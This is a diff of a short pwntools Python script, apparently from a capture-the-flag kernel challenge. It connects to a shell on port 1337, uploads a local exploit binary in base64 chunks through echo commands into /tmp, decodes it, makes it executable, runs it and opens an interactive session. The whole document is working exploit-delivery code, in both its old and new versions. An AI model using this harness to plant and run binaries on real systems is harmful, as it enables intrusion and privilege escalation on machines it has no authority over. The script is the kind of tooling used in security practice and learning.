@@ -1,45 +1,34 @@
 from pwn import *
-import time, os
-#context.log_level = "debug"
+import base64
+context.log_level = "debug"
 
-os.system("tar -czvf exp.tar.gz ./exp")
-os.system("base64 exp.tar.gz > b64_exp")
+with open("./exp", "rb") as f:
+    exp = base64.b64encode(f.read())
 
-total_count = 1
+try_count = 1
+
 while True:
-    log.info("total exp time: {}".format(total_count))
-
+    log.info("exploit for No.{} time".format(try_count))
+    
     p = remote("127.0.0.1", 1337)
-    f = open("./b64_exp", "r")
-
+    #p = process('./run.sh')
+    
     p.sendline()
     p.recvuntil("/ $")
-    p.sendline("echo '' > /tmp/b64_exp;")
 
-    count = 1
-    while True:
-        print('now line: ' + str(count))
-        line = f.readline().replace("\n","")
-        if len(line)<=0:
-            break
-        cmd = b"echo '" + line.encode() + b"' >> /tmp/b64_exp;"
-        p.sendline(cmd) # send lines
-        #time.sleep(0.02)
-        #p.recv()
-        p.recvuntil("/ $")
+    count = 0
+    log.info("total counts: {}".format(len(exp) / 200))
+    for i in range(0, len(exp), 0x200):
+        p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> /tmp/b64_exp")
         count += 1
-    f.close()
+        log.info("count: " + str(count))
 
-    p.sendline("base64 -d /tmp/b64_exp > /tmp/exp.tar.gz;")
-    p.sendline("tar -xzvf /tmp/exp.tar.gz")
-    p.sendline("chmod +x /tmp/exp;")
-    p.sendline("/tmp/exp")
+    for i in range(count):
+        p.recvuntil("/ $")
+    
+    p.sendline("cat /tmp/b64_exp | base64 -d > /tmp/exploit")
+    p.sendline("chmod +x /tmp/exploit")
+    p.sendline("/tmp/exploit ")
+    
+    p.interactive()
 
-    rcv = p.recv()
-    if b'fail' in rcv:
-        log.debug("failed again!")
-        total_count += 1
-        continue
-    else:
-        p.interactive()
-        break
